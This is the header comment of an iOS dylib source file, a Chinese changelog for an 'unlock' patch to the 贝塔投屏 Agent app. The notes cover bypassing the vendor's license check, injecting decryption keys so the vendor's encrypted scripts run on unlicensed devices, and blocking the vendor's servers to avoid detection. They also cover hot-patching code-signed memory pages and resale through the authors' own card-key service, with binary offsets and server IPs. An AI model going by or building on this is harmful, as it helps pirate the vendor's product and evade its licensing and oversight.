// bs_unlock.m —— 贝塔投屏 Agent 解锁 dylib (v5)
//
// 演进
// ----
// v1  constructor 里直接调 _dyld_* / ObjC → 加载期死锁
// v2  改为独立线程 + 延迟 2s；只做 mushroom_head 注入
// v3  新增「脚本加载闸门自愈看门狗」（2026-09-26 在 192.69.0.47 上实证）
// v4  新增「本地模块注入」—— 把服务器才下发的热更模块喂给产品的 onion 字典
// v4.1 修复 v4 的「只灌一次」缺陷：改为按 onion 字典对象指针变化重灌
// v5  ★ 新增「路线 A」：从 PC 中控主动拉取模块
//       - [v5~v6.1] 读 App 数据目录的 app.plist 拿中控 IP（设备端天然入口）
//       - [v6.2 起]  ★ 不再读 app.plist！改为内置 BS_HOST_DEF（公网模块服务端），
//                    bs_pull.conf 可用 host= 覆盖。理由见 BS_HOST_DEF 处注释：
//                    app.plist 的 ip 是**贝塔投屏 App 连电脑中控**用的（用户手填），
//                    跟本补丁的服务端地址是两回事，共用一个文件会互相踩。
//       - GET http://<pc>:8080/manifest.json
//       - 比对本地 /var/mobile/Media/bs_modules/ 的 md5
//       - 缺/过期 → GET /modules/<name> → 校验 → 写盘 → 重灌 onion 字典
//       ⇒ 从此**不再需要 SSH、不再需要 MatisuXCS(8182)** 即可分发模块
// v5.2 修复：dylib 必须 adhoc 签名（否则 AMFI GUARD kill）；bs_log 去 NSLog
//          （裸 pthread 上 NSLog 崩 objc_msgSend）
// v5.3 诊断探针：bs_log 逐 step 打点，精确定位到 step5 后的解析环节
// v5.4 ★ 根治崩溃：路线 A 全链路**纯 C 化**——只用 OS 原语，不碰 ObjC 运行时
//       - bs_read_pc_ip_c   纯 POSIX 读 app.plist，抠 <string>（v6.2 已废弃，见下）
//       - bs_parse_manifest_c 自写 JSON 扫描器（替代会崩的 NSJSONSerialization）
//       - bs_md5_file/bs_md5_hex 自实现 md5（纯 C，已用 Python 对照 hashlib 验证）
//       - bs_http_get_c     唯一保留的 ObjC 路径（NSURLSession，实测裸线程安全），
//                           出参是 malloc 的 C buffer，把 ObjC 面收到最小
//       - 注入改由 watchdog 线程按 g_need_inject 标志执行，puller 只置位
//       实测：JSON 解析崩溃点（NSJSONSerialization → 0x10 SIGSEGV）已消除
// v5.5 ★ 根治 bs_http_get_c 的 use-after-free（2026-09-26，.45 实测崩溃帧定位）
//       - 症状：Agent 点「启动服务」后 2~6s 内猝死；崩溃报告
//               #1 bs_unlock.dylib  bs_http_get_c +0x5f04
//               #0 libobjc.A.dylib  objc_msgSend（KERN_INVALID_ADDRESS at 0x10）
//       - 反汇编锁定 0x5f04 = `ldr x0,[byref+0x28]; bl objc_msgSend$length`，
//               即源码 `out.length`（__block NSData *out）
//       - 根因：**CI 编译没加 -fobjc-arc ⇒ MRR**，block 里 `out = d` 不 retain，
//               `d` 属于 NSURLSession 回调队列的 autorelease pool，出 block 即死。
//               （`done==YES` 仍崩，是 use-after-free 的铁证）
//       - 修法：回调线程内部**当场 memcpy 到 malloc buffer**，只把裸指针+长度
//               通过 calloc 的 slot 结构带回；ObjC 对象生命周期不出 block。
//
// v6.4 ★★ probe 模式（2026-09-28，真卡机只读雷达）
//       - 同一份 dylib，conf `mode=probe` 时切成「只读上报」：
//         不注入密钥 / 不起心跳 watchdog / 不 pull 模块 / 不打 Agent 补丁
//       - 周期读本地 beta.so 版本 + `_g_script_mushroom_head` 快照 →
//         POST /probe（"BSPR" 帧：密钥 + 包）→ 云端入库，供免卡密机自取
//       - ⇒ 真卡机升脚本后自动上架密钥，PC 侧哨兵可完全省掉
//       - 新增 bs_http_post_ex / bs_read_file / bs_hex3 / bs_mh_snapshot / bs_probe_thread
//
// v6.5 ★★ 版本跃迁自愈（2026-09-28，免卡密机「跟版不掉链」）
//       - 缺陷（v6.4 及以前）：bs_inject_mh 只在 bootstrap 调一次；App **运行中**
//         若官方把 beta.so 从 2.9.9 蹦到 3.0.0，_g_script_mushroom_head 里没有
//         新版本键 → `can not find version key!!` → 脚本挂，直到用户重开 App。
//         （官方下包是自动的：心跳 → find ver changed! → 147 块重下；
//           但下完后约 12s 就重新加载脚本，而 puller tick 默认 300s，来不及补键。）
//       - 做法：新增 bs_verwatch 轻量线程（默认 3s）——纯 C 读 beta.so 头 4B，
//         版本号一变就调 bs_inject_mh：向 /key 取该版本密钥 → **合并**进字典槽位。
//         ⇒ 3s 内补齐密钥，早于脚本重载，无需重开 App。
//       - bs_inject_mh 改为「按版本幂等」：槽位已含该版本键则快路径直接返回
//         （纯 C，不碰 ObjC）；否则合并注入。首次仍是 bootstrap 调一次。
//       - 新增 bs_verwatch / VERWATCH_TICK_SECS / g_mh_ver / bs_mh_has / bs_verhex_to_bytes
//
// v6.6 ★★ 主动跟版（2026-09-28，免卡密机不依赖官方通道也能拿到新 beta.so）
//       - 缺口：v6.5 只解决「密钥」，**包本体**仍依赖官方 server2 分块下发。
//         若官方通道不可达 / 不下发，盘上永远停在旧脚本。
//       - 做法：解锁模式新增 bs_so_sync 线程（默认 120s）——
//           GET /ver?prj=sjz            → 云端最新版本（只元数据，不吐正文）
//           比本地新 && 云端有该版本密钥  → GET /script/beta.so?ver=<新版本>
//           校验「体积下限 + 包头版本字节」→ 写 .sync.tmp → fsync → rename 原子落盘
//         ⇒ 落盘后 verwatch（3s）自动补密钥，与官方通道**互为备份**。
//       - 只升不降：云端版本 <= 本地一律不动（防回退）。
//       - 云端有包但密钥未上架 → 不拉（拉下来解不开），下轮再看。
//       - probe 模式**不启动**本线程（真卡机业务零改变这一条不变）。
//       - 新增 bs_so_sync_once / bs_so_sync_thread / bs_write_file_atomic /
//         bs_json_pick_ver / bs_json_has_true / SO_VER_PATH / g_so_sync / g_so_tick
//       - ⚠️ 落盘 ≠ 生效：脚本**不热加载**，仍要一次重开 App（或官方那一跳心跳带来的重载）。
//         本功能保证的是「包已在盘上」，不是「立刻在跑」。
//
// v6.7 ★★ 落盘后自动重启（2026-09-28，把「点运行」这一步也自动化）
//       - 缺口：v6.6 把包拉到盘上后，用户还得手动点一次中控「运行」才生效。
//       - 前提（产品硬约束，已实证）：_bb_load_script 闸门 —— g_lua_state != 0 时
//         点运行/发启动一律 **return -1、静默失败**。所以「重启」必须先把 state 清零。
//       - 做法（conf `autoreload=` 默认 1，写 0 关闭）：
//           so_sync 落盘成功后读 _g_bb_script_run：
//             run == 1 → 置 g_need_reload，交给 watchdog 执行重启
//             run == 0 → 只落盘（没在跑就没人需要新版本），打日志跳过
//           watchdog 小状态机（2s tick）：
//             STOP(_set_user_script_operate(1)) → 等 g_lua_state 归零
//             → START(operate(0)) → 等 run 变 1 → 收工
//             任一步超时（RL_ZERO_TICKS / RL_RUN_TICKS）→ 放弃 + 记日志，不重试
//       - ★★ 重启期间 g_reload_busy 屏蔽两条既有逻辑，否则互相打架：
//             ①「run 1→0 立刻抹模块」——不屏蔽的话每次自动重启都会清空 3 个 .lua，
//               脚本重启后 wait_call_func 拿不到模块 → 业务卡死。
//             ②「僵死自愈（st!=0 && run==0 连续 10s → STOP）」——不屏蔽会补发 STOP。
//       - probe 模式不启用；so_sync 只在版本**真的变化**时才落盘 ⇒ 每个新版本最多重启一次。
//       - 新增 OPER_START / g_autoreload / g_need_reload / g_reload_busy / RL_* 常量
//
// v6.8 ★★ 下载长超时 + 重载键对齐（2026-09-28，两台外网弱网机 + .45 实测事故驱动）
//       - ① 弱网下载超时：A(111.172.226.88)/B(111.172.194.181) 日志实锤 ——
//         beta.so 下载共用 PULL_TIMEOUT=6s（resource 8s），弱网 8s 拉不完 1.16MB
//         → NSURLErrorTimedOut(-1001) → 0 字节 → bad size 0 abort，每 120s 白拉一次
//         （A 38 次 / B 9 次），服务端还以为发完了。修法：拆 bs_http_get_ex_tmo，
//         beta.so 下载专用 SO_DL_TMO_REQ=60（空闲）/ SO_DL_TMO_RES=300（总预算），
//         信号量等待跟随 resource；小请求仍 6s/8s。
//       - ② 重载键对齐：.45 实测 START(19:08:36) 早于 verwatch 键注入(19:08:56)
//         → 脚本拿旧键解新包 → 解密失败 → 16s abort reload。修法：so_sync 置位时
//         记 g_rl_ver=目标版本；watchdog 在 state 归零后、START 前等
//         g_mh_ver==g_rl_ver（RL_KEY_TICKS=30*2s=60s，容纳 verwatch 缺键 30s 节流），
//         超时放弃不重试。
//
// v6.9 ★★ 局域网中继分流（2026-09-28，跨境链路 ~50KB/s 实测驱动）：
//       云端回环自测 278MB/s、本机→云端仅 41-53KB/s ⇒ 瓶颈是跨境链路不是服务器；
//       批量设备同时拉包会互相挤占。方案：中控 PC 跑轻量中继 bs_relay.py（只管
//       beta.so 的下发/上传），设备侧新增 conf 键 sohost=/soport= —— 仅 beta.so
//       下载走中继（局域网毫秒级），/hb /key /ver /probe /modules 仍直连云端。
//       中继挂掉只影响「有没有更新」，不影响心跳与模块注入。缺省不填 = 行为同 v6.8。
//
// v6.10 ★★ 设备信息自动上报（2026-09-28，云端设备表增强）：
//       /hb（与 /manifest）query 追加 &nm=<设备名>&md=<型号>&ov=<系统版本>：
//         nm = kern.hostname（如 8112）  md = hw.machine（如 iPhone13,2）
//         ov = kern.osproductversion（如 15.8）
//       纯 C sysctl + 百分号编码（设备名可能是中文/空格）。服务端解析入库
//       并在设备表展示（缺失显示 —）。g_qbuf 160→512、hb/manifest URL 缓冲 512→768。
//
// v6.11 ★★ 中控 IP 自动上报（2026-09-28，用户要求）：
//       读 app.plist（DATA_DIR/app.plist）的 ip —— 那是 App 连电脑中控的地址，
//       用户手填。v6.2 起我们不拿它当服务端地址（避免互踩），但作为**上报数据**
//       毫无冲突：/hb 追加 &pc=<中控IP>，云端设备表「中控IP」列自动填充
//       （手动备注优先）。纯 C 读 plist 抠 <key>ip</key> 后的 <string>。
//
// v6.12 ★★ 中继地址 = app.plist 的中控 ip（2026-09-28，用户拍板「不是回退，就是读它」）：
//       中控 PC 即中继 PC（同一台机器跑 BBCenter + BSModuleServer.exe）——
//       用户在 App 里填好中控 IP，beta.so 下载自动走 http://中控ip:soport(默认27391)。
//       conf 的 sohost 降级为应急覆盖（正常部署不填）；app.plist 缺失/为空 → 直连云端。
//       ★ 保险：中继拉包失败（PC 没跑 exe / 不在线）→ 自动回退直连云端拉一次。
//
// v6.13 ★ 中继地址每次下载现读 app.plist（2026-09-28，用户要求）：
//       不再用 conf 加载时缓存的 g_appip——用户中途改了中控 IP，下一轮下载就用新值。
//       g_appip 仅保留给 [conf] 日志展示。
//
// v6.14 ★★★ 密钥被产品或冲掉后自愈（2026-09-29，.45 现场事故根因）：
//       症状：`agent.log` = `begin load script` → `can not find version key!!`
//             → `load snail module failed`，中控点「运行」报「加载运行库出错」；
//             重开 App 能好一阵，然后复发。
//       根因：产品的 `_set_script_mushroom_head`(0x464c) 是**整表替换**——反汇编实证
//             `ldr x0,[x8,#0x20]` / `str x19,[x8,#0x20]` / release(old)，没有任何合并。
//             免卡密机拿不到官方密钥回包（`recv rep key failed` 反复出现），产品
//             依然会按自己的流程重设该字典 → 我们注入的键整个被冲掉。
//             而 v6.5~v6.13 的快路径是「**版本号相同就直接 return**」（先比版本、后查键），
//             于是 verwatch 每 3s 跑一次也永远修不回来 —— 这就是官方文档里那句
//             「必须人工重开 App（dylib 才会重新注入）」的真正原因。
//       修法：① 判据反转 —— **先查键在不在字典里**，不在就补（版本相同也补）；
//             ② 同版本密钥**缓存**在进程内存（g_mh_kk/g_mh_vv），补回时**不发 HTTP**，
//                纯本地合并（微秒级，哨兵 3s 一轮可无限次安全重放）；
//             ③ 补回时打 `[mh] key <ver> missing in dict (n=?) -> re-inject from cache`
//                —— 现场一眼可见「是不是被冲掉了」。
//
// v6.15 ★★★★★ beta.so 是**多记录混合版本**容器 ⇒ 必须注「两把」键（2026-09-29，`.45` 终局定论）：
//       症状：盘上 beta.so 明明是新版（030001）、字典里也确有 030001 且查得中，
//             加载却仍 `can not find version key!!`。
//       实测（探针抓帧）：Agent 在 `_bb_load_snail_module` 里逐条记录查密钥，
//             查的是 **020909**，不是文件头的 030001：
//               [lookup] key=020909 found=False caller=Agent+0xbe44 → [LOAD_ret] 0xffffffff
//       反解容器（`_res/beta.so` 等三份逐字节对照）：
//             每条记录 = [type 1B][ver 3B][hash 32B][未压缩长度 4B LE][压缩长度 4B LE] + zlib
//               记录0 type=0x00 元数据（解出来就是 json/sjz/player.json）→ ver = **项目版本**
//               记录1 type=0x01 脚本载荷                         → ver **恒为 020909**
//             ★ 2.9.9 / 3.0.0 / 3.0.1 三份文件的载荷记录**版本号与 32B hash 完全相同**
//               ⇒ 020909 是厂商固定的「载荷/容器格式版本」，与项目版本无关。
//       因果：v6.3~v6.14 只按**文件头**取一把键（`[mh] ver changed -> 030001`）
//             ⇒ 元数据记录有键 ✅、载荷记录 020909 **无键** ❌ ⇒ 加载失败。
//             昨天能用只因盘上还是 2.9.9（两条记录都是 020909，单键全覆盖）。
//             盘上之所以变成 3.0.x：设备侧 `bs_so_sync`(sosync=1 只升不降) 从云端自己拉的，
//             **不是人为改动**。
//       修法：新增 `bs_ensure_payload_key()` —— 独立于头版本，确保 `020909` 这把键也在字典里：
//             ① 字典已有 → 直接返回（零开销）
//             ② 否则 `GET /key?prj=&ver=020909` → 回包 35B 且首 3 字节 == 020909 才采用
//                （**云端可取 ⇒ 不必重编译即可换载荷版本**）
//             ③ 取不到 → 用编译期内置 `kKey/kVal`（已验证与线上 020909 逐字节一致）
//             ④ 取到的载荷键**缓存进进程内存**（g_pay_vv/g_pay_cached）⇒ 被冲掉时离线秒补
//             bootstrap 与 verwatch 各调一次（紧跟 bs_inject_mh 之后）。
//
// v6.16 ★ 模块服务端整体迁移（2026-10-01，用户指令）：
//       老云 47.243.156.129 弃用（数据已全量搬走），新云 = **47.116.161.226**（Docker 部署，
//       容器 bsmod，python:3.12-slim，/opt/bsmod 挂载，端口仍 47391）。
//       仅改 BS_HOST_DEF 内置默认值；bs_pull.conf 的 host= 覆盖逻辑不变。
//       配套：deb postinst 的 PCIP 默认值同步改（build_allinone_deb.py）。
//
// v6.17 ★★★★★ func-nil 崩溃自动恢复（脚本看门狗升级，2026-10-01）：
//       症状（.45 实测）：脚本连续跑 4~5h 后，agent.log 打
//             `run script error:[string "UNKONW = 0 ..."]:1: attempt to call local 'func' (a nil value)!`
//             → agent stop script。09-26 与 10-01 两次同签名，10-01 那次卡在
//             夜间休息(0~7点)醒来后 2 秒。
//       根因（胶水脚本 + bb_common.lua 双份同逻辑，反解实锤）：
//             wait_call_func 内置自刷新定时器 g_wait_call_interval = 4~5h 随机，
//             到点执行 `load(name.."=nil")()` 把模块全局函数抹成 nil（厂商热更新设计），
//             靠 Agent 原生 waitCallModule(name) 重载恢复；
//             但重载路径 `func = load("return "..name)()` 拿回 nil（waitCallModule 未真正
//             重执行模块文件）→ `return func(...)` 崩。夜间长睡使定时器在静默期到点，
//             醒后连续两次调同一模块必踩 → 「跑久了必崩」的元凶。
//       修法（watchdog 新增 crash-resume 分支，conf `crashresume=` 默认 1）：
//             ① 每 tick 对 agent.log 做增量扫描（记 size 基线，首轮只记不扫）；
//             ② 新增字节命中签名 `attempt to call local 'func' (a nil value)` 且
//                脚本已停稳(run=0 st=0 saw_run=1)且非 reload_busy 且心跳在授权(g_hb_ok=1)
//                → 发 OPER_START 自动拉起（等价中控再点一次运行）；
//             ③ 冷却 CR_COOLDOWN=300s，防止异常场景连拉；
//             ④ 日志轮转（size 变小）只重置基线不扫描，避免旧签名误触发。
//       不自动拉起的情形（自然排除）：中控主动点停 / killswitch（403 拒绝）/ 心跳失联
//             —— 这些路径的 agent.log 都不含 func-nil 签名。
//       ★ v6.24b 补漏（2026-10-17 .115 实锤）：v6.24a 只在「新增字节命中签名」时
//             动作，OPER_START 后脚本若二次崩溃（bb_common 仍 nil）不再产生新签名
//             → 永久躺平（16:16 崩，停到 17:09+ 未恢复）。改为「崩溃检出 → pending
//             状态机 → 60s 起递增至 600s 封顶无限重试」，直到 run=1 或条件不满足。
//             因为只在真实崩溃签名命中时置位，休眠静默不会误触发（不复活 v6.23z
//             的静默看门狗）。特征串 "[cr] retry #" / "[cr] recovery OK"。
//
// v6.18 ★★★★★ 多版本键注入 + 跟版键闸门（2026-10-01，3.0.5 实战驱动）：
//       症状（.45 实测）：beta.so 030001→030005 跟版后，每次 run script 都
//             `can not find version key!!` → `load snail module failed` → agent stop script。
//       根因（beta_so_parse.py 解 3.0.5 实锤）：3.0.5 段流**混用多版本键** ——
//             18 个 lua 记录各自带版本 030002/030003/030004/030005（厂商混段兼容旧逻辑），
//             PNG 记录仍 020909。而 v6.15 注键模型 = 头版本键 + 020909 载荷键两把，
//             字典里永远缺 030002~4 → 逐记录查键必炸。2.9.9~3.0.1 没炸只因
//             当时全部 lua 记录与头同版本，两把键恰好全覆盖。
//       修法（两处，互相配套）：
//             ① verwatch 每 tick 增加一步：扫盘上 beta.so 的**全部段头版本**
//                （按厂商容器格式游走：type0=44B 头+csz、type1=46B 头+align16(ci)、
//                type2=42B 头+align16(nl+cl)；异常即停，只取已扫到的），对每个版本
//                走「字典有？→ 云端 /key → 合并注入」的 ensure 流程（带 per-ver 节流）。
//                扫描结果按 (size,mtime) 缓存，文件没变不重扫。
//             ② so_sync 落盘前加**键闸门**：下载的新包先扫版本，逐版本确保键到手
//                （云端取到即顺手注入预热），任何一把取不到 → 不落盘、保持旧包，
//                等 sotick 下一轮重试。杜绝「包切了键没到」的断档窗口。
//                扫描失败（0 个版本，格式异常）→ 保守放行走老逻辑并打警告。
//
// v6.19 ★★★ 厂商服务器进程内屏蔽（2026-10-01，用户指令：假卡反侦察）：
//       目标：假卡机完全切断厂商二进制层的 vps.beibeiplay.com（43.154.19.236，
//             Agent 启动时 TCP 一次 + UDP 7891 探测）—— 厂商侧看不到这台设备。
//       影响面实证：解锁/密钥/跟版/模块全走我们云端（47.116.161.226，裸 IP），
//             中控走 app.plist 的 PC IP，脚本层 60.204.159.47 是裸 IP——
//             三者均不依赖该域名，屏蔽零影响（真卡机 probe 模式不装钩子，
//             卡密心跳不受影响）。
//       实现（fishhook，仅 unlock 模式安装）：
//             ① getaddrinfo("vps.beibeiplay.com") -> EAI_NONAME（域名解析掐断）
//             ② connect(sin_addr==43.154.19.236) -> -1 EHOSTUNREACH（兜底硬编码 IP）
//             ③ constructor 起独立线程**尽早安装**（赶在 Agent 首次外联前），
//               自行快扫 conf 的 mode=/blockvps=（不依赖 bootstrap 的 2s sleep）
//             ④ conf 新键 `blockvps=`（缺省 1 = 屏蔽；写 0 关闭）
//       日志：[blk] 前缀，前 5 条全打 + 之后每 60 条采样，防刷屏。
//       已知边界：fishhook 只能重绑**调用方镜像**的符号表 —— 若厂商经
//             CFNetwork（共享缓存内部）外联则拦不住；实测观察 [blk] 计数，
//             若始终为 0 且厂商流量仍在，退回路由器防火墙方案。
//
// v6.20 ★★★ 自有卡密系统接入（2026-10-02，CardVault v2 @ 47.116.161.226:18095）：
//       背景：Agent 5 点补丁=绕厂商验证（2038 恒过），但设备分发需要**自己的**
//             卡密管理。复用厂商输入通道：中控右键输入激活码 → card_sync →
//             Agent 内存全局变量 g_agent_activate_card（已实证不落盘）。
//       实现（仅 unlock 模式，conf cardcheck= 缺省 1）：
//             ① dlsym 解析 get_agent_activate_card / get_agent_auth_state
//               （回退：直接读 g_agent_activate_card 缓冲区），cardwatch 线程
//               3s 轮询卡密变化
//             ② 新卡密 → POST /api/client/login（X-Card-Key=app_key，
//               device_id=硬件序列号 hw.serial，回退 token）→ code=0 绑定/续期
//               成功；业务码 1~5 = 未激活/冻结/过期/绑他机 → 封禁
//             ③ 心跳：每 cardtick(300s) 重发 login 刷新在线状态与到期
//             ④ 宽限：网络失败不清判决，超过 cardgrace(72h) 无成功校验才封；
//               判决缓存落盘 DATA_DIR/bs_card.txt（冷启动即判）
//             ⑤ 封禁动作：OPER_STOP + 拒绝模块注入 + 拒绝 puller 拉模块 +
//               拒绝 crash-resume（**不抹 beta.so/不清模块文件**——可逆，
//               续卡后自动恢复）；恢复时打 [card] re-authorized
//       conf 新键：cardcheck=（缺省 1）、cardgrace=（小时，缺省 72）、
//             cardtick=（秒，缺省 120）、cardkey=、cardhost=（缺省内置）
//       日志：[card] 前缀。
//       业务码对照（CardVault v2）：0 ok / 1 不存在 / 2 冻结 / 3 过期 /
//             4 次数用完 / 5 绑定其他设备 / 401 应用未授权。
//       ⚠️ 该应用只用时长卡，禁用次数卡（login 心跳会扣次数）。
//
// v6.21 ★★★ 卡密捕获三通道 + interpose 强化（2026-10-02）：
//       背景（.45 实测 22:21）：中控输卡 → Agent「begin process activate card!」
//             打出卡号 → _bb_run_auth 连厂商验卡 →「卡密不存在！」→
//             **厂商验卡失败不写 g_agent_activate_card** → cardwatch getter
//             永远读空 → CardVault 激活链路断。且 [blk] 计数=0：_bb_run_auth
//             的 connect 走共享缓存内部调用，fishhook 拦不住（边界实锤）。
//       修复：
//             ① agent.log 捕获（主通道）：cardwatch 增量 tail agent.log，
//               解析「begin process activate card!」下一行卡号（8~40 位大写
//               数字母校验）→ 直接送 CardVault login。保留中控输卡 UX，
//               「卡密不存在」弹窗无害可无视。
//             ② conf `cardval=`（兜底通道）：getter/log 均无卡时用 conf 卡值
//               激活 —— 新设备预写 conf 开机即活，不依赖输卡动作。
//             ③ dyld interpose 兜底（connect/getaddrinfo）：__DATA,__interpose
//               对**全进程所有调用点**生效（含共享缓存回呼），与 fishhook
//               并存；orig 指针 fishhook 填充失败时 dlsym(RTLD_NEXT) 补。
//       日志：[card] captured from agent.log / [blk] 计数应开始增长。
//       卡源优先级：Agent 内存 getter > agent.log 捕获 > conf cardval。
//
// v6.22 ★ 中控授权到期时间与卡密一致（2026-10-03）：
//       背景：假卡 5 点补丁把 set_agent_auth_valid_time 改成硬编码
//             `mov x19,#0x7fff0000`（str w19 → 2038-01-19）→ 中控恒显 2038，
//             与 CardVault 真实到期对不上，容易看错。
//       反汇编实证：g_agent_auth_valid_time = int32 epoch @ 0x1000530c0，
//             **全二进制唯一写点就是那个 setter** → 直接写全局无覆写风险。
//       实现：cardwatch 每 tick 调 bs_sync_vendor_expire()——dlsym 拿
//             g_agent_auth_valid_time，g_card_expire>0 且值不同才写
//             （写前读比对，日志打 old->new）；login OK 后也即时同步一次。
//       效果：中控「授权到期时间」= 卡密真实到期；卡过期时厂商状态机
//             （valid_time<now 判定）也会自然翻过期，显示与行为一致。
//
// v6.23 ★ setter 中和：显示彻底稳定（2026-10-03，.45 实测驱动）：
//       实测：v6.22 同步生效但每 3~15s 被改回 0x7FFF0000 —— 厂商认证
//             状态机 _bb_RPFBXL3V9G / _bb_ZXBDWUMM1Y 周期性调
//             set_agent_auth_valid_time（补丁版恒写 2038）→ 显示抖动。
//       修复：cardwatch 启动时运行时补丁 —— setter 入口(+0xd94c)写 ARM64
//             `ret`（0xd65f03c0），厂商调用变空操作；valid_time 只剩
//             cardwatch 一个写者，显示恒定。mprotect+icache 失效齐全。
//       边界：仅 unlock 模式执行（probe 真卡机不动厂商代码）。
//
// v6.23b ★ 补丁通道换 mach_vm_remap（2026-10-03，.45 实测 errno=13 驱动）：
//       实测：mprotect(__TEXT, RWX) 被内核拒（errno=13，iOS 代码签名强制
//             W^X，roothide 亦然）→ v6.23 首版补丁没打上，改回依旧。
//       修复：两步 remap —— mach_vm_allocate 临时页 → memcpy+改字 →
//             mach_vm_remap(VM_FLAGS_OVERWRITE) 整页覆盖文本页（ellekit
//             同款技术，不触碰 mprotect 对签名页的限制）→ icache 失效。
//
// v6.23e ★★ 卡密 code 解析 bug 修复（2026-10-03，冻结实测失效驱动）：
//       实测：后台冻结卡（status=2，服务端铁证返回 code=2），设备端心跳
//             4 拍连续 login OK —— 冻结/过期/绑定冲突完全拦不住。
//       根因：bs_card_parse 用 strtol(p+6) 取 code，p+6 指到 JSON 冒号，
//             strtol(":2") 无有效数字**恒返回 0** ⇒ 一切业务失败码都被
//             当成 0=成功（g_card_expire 无 expires_ts 保持旧值 + lastok
//             刷新 → 宽限判决永远通过）。
//       修复：先 strchr 找 ':' 再 strtol（与 expires_ts 解析对齐）。
//
// v6.23f ★★ 重启后心跳断流 → 缓存卡兜底（2026-10-03，拉黑实测失效驱动）：
//       实测：.45 拉黑后中控脚本一直跑。设备 16:31 重启后 5 小时零心跳日志。
//       根因：重启后厂商内存激活卡清空 + agent.log 截断（tail scan hit=no）
//             + conf cardval 未填 → 三卡源全空 have_card=0 → 心跳分支
//             （条件 have_card && g_card_cur[0]）永不执行 → 设备不再联系
//             卡密服务器；判决却用缓存 expire（2026-11-03）恒过 → 脱机永动。
//       修复：新增第④卡源 = 卡密缓存 g_card_cur（getter > 日志 > conf >
//             缓存），have_card=0 时用缓存卡继续心跳；服务端冻结/拉黑/
//             过期照常经心跳送达 → rc>0 清 expire/lastok → BLOCKED +
//             OPER_STOP；解冻/续费也照常自动恢复。一次性诊断行
//             "card source = cache fallback"。
//
// v6.23g ★ 网络宽限 72h→1h（2026-10-03 用户拍板）：断网 1 小时内可续命，
//          超过即封；conf cardgrace= 可覆盖。
//
// v6.23i ★★ BLOCKED 每拍 wipe（2026-10-03，删卡实测仍运行驱动）：
//       实测：.45 删卡后 login FAIL code=1 → BLOCKED + OPER_STOP + gates 全到位，
//             中控一点运行脚本照跑。根因：BLOCKED 只「拒绝新注入」，onion 字典里
//             封禁前注入的模块代码还在 —— 厂商脚本引擎直接拿旧代码执行。
//       修复：封禁期间每拍 ① 清空 onion 字典（removeAllObjects，isKindOfClass
//             防不可变字典异常）② unlink 本地模块 *.lua（复用 killswitch 逻辑，
//             抽成 bs_wipe_local_modules）。厂商/中控若重灌，下一拍再清。
//             恢复全自动：卡重新有效 → pull 重下模块 → wd 重注入。
//       语义（用户拍板）：无激活卡 / 激活后被删 / 冻结 / 拉黑 / 过期 / 绑他机
//             —— 一切 BLOCKED 态 = 删模块 + 停脚本。
//
// v6.23j ★ device_id 防 "unknown" 共享（2026-10-03，外网激活实测驱动）：
//       实测：某设备 hw.serial 返回字面量 "unknown"（非空）→ 旧写法直接采信，
//             绑定字段存 "unknown"；所有无序列号设备共享此 id ⇒ 绑定比对
//             unknown==unknown 恒过，一张卡可被多台设备共用（业务漏洞）。
//       修复："unknown" 视为无效 → 回退 g_token（postinst 每机唯一设备码）；
//             两者皆无才 "unknown"。bs_card_device_id 加日志便于远端定位。
//
// v6.23k ★ 设备日志回传（2026-10-03，外网设备排障无日志驱动）：
//       bs_unlock.log 尾部 ≤8KB 随 puller 每拍 POST /devlog?key=<token> 到云端；
//       云端存 devlogs/<token>.log，后台网页设备列表加「日志」按钮直接看。
//       无增长/50s 内不重发；失败静默，不影响主链路。
//
// v6.23l ★ 统计上报改道（2026-10-04，本地统计站落地驱动）：
//       conf 新键 statip=<IP>：connect 层把 60.204.159.47:7875(统计)/7880(照片)
//       改写到 statip（本地统计站）。不依赖 beta.so 版本/lua 变量名，厂商更新免疫；
//       放 g_blk_active 闸门之前，probe 配了 statip 同样生效；未配置零开销。
//       换统计服务器只改 conf 一行，无需重编 dylib。
//
// v6.23m ★ 改道目标默认跟 app.plist（2026-10-04，用户拍板「中控与统计网站都是
//       app.plist 那台电脑」）：statip 优先；未配置时每次 connect 现读
//       app.plist 的中控 ip（与 v6.13 中继同款逻辑）作改道目标，端口不变。
//       分发场景零配置——对方把 exe 放自己电脑、设备 app.plist 填他 IP，
//       统计自动落到他电脑，无需 conf 再填 statip。
//
// v6.24r ★★★ 可观测性补丁（2026-10-20，用户批准）：解决「落盘 ≠ 生效」无法远程判读
//       + 崩溃现场被高频流水冲掉。三件事，全部只观察、不自动运行脚本（铁律不动）：
//       ① 独立事件道 bs_evt.log：`[us]` / `[cr]` / `[so]` / `[wd]` 决策级事件双写
//          （主日志照旧 + 专道追加），并新增 `&src=evt` 上报通道随 puller 每拍回传。
//          动机：主日志被 `[pull] step1~5`、`recv rep key failed`(14s/次)、
//          `dns look up failed`(6.6s/次) 淹没，8KB 窗口只剩 6~12 分钟 —— 10-20
//          三台设备（e9643 / edf7 / a39cb6）崩停现场全在 10 分钟内被冲干净，
//          远程永远只能看到「停了」，看不到「为什么停」。事件道几十条/天，8KB 可存数周。
//       ② 运行库生效状态 `.bs_so_state`（md5/size/pend/applied）：落盘新 so 置 pend=1，
//          watchdog 观察到「run=1 且 sjz 新鲜」时清 pend=0。动机：v6.24q 删掉自动重载后，
//          换包瞬间正在跑的脚本仍用内存旧 so —— a39cb6 于 17:02 落盘 fix4、17:32 仍崩在
//          fix3 上，而远程完全看不出「盘上新的、内存旧的」。bootstrap：无状态文件时按
//          盘上 beta.so 的 md5 建基线（pend=0），保证全网每台都能被读到。
//       ③ `[cr] stall scan` 追加 `so=<md5前8> pend=<0|1> size=<n>`：一眼分清三种停摆
//          ——盘上是旧的坏包 / 盘上新包但还没重启脚本 / 新包已生效仍然停。
//
// v6.24p ★★★ 删除一切「自动运行脚本」（2026-10-20，用户指令：除「脚本本来在跑」
// v6.24q ★★★ [rl] so_sync 自动重载整体移除（用户指令：新 so 只落盘，脚本由人工
//       手动运行时加载）——核对 v6.24p 时发现 reload 的 STOP→START 窗口内用户点停止
//       会被 g_reload_busy 屏蔽判据而漏检，与其补丁不如干脆删掉整条自动 START 路径。
//       至此全 dylib OPER_START 归零：任何代码路径都不再运行脚本。so_sync 下载/
//       校验/修复保留（纯落盘），verwatch 按盘上版本预铺密钥（手动运行即可解新包）；
//       conf autoreload= 键仍解析但无动作点（同 crashresume 先例）。
//       与「中控手动下发运行」外，其余一律不得自动运行脚本）：
//       ① [hg] 假运行看门狗（v6.24m/n）整块删除 —— OPER_STOP→OPER_START 自动重启；
//       ② [cr] 崩溃签名自动 OPER_START 删除 —— 崩溃只落证据 + 节流日志，原地停住等人点；
